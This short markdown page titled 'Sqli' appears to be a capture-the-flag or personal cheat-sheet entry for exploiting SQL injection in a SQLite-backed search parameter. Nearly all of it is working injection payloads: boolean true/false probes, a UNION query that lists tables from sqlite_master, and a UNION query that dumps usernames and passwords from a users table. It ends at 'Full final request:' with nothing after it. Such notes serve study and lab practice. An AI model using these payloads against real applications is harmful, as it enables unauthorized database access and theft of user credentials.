---
title: "Sqli"
weight: 1
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
# bookHref: ''
# bookIcon: ''
---

```yml 
sqlite3 

1. Confirm true condition:
q=f%' AND 1=1 AND 'x%'='x
2. Confirm false condition:
q=f%' AND 1=2 AND 'x%'='x
True returns results; false returns none.
3. Enumerate SQLite tables:
q=' UNION SELECT name,sql FROM sqlite_master-- -
This reveals users(username,password) and flags(key,value).
4. Dump the users table:
q=' UNION SELECT username,password FROM users-- -
Full final request:
```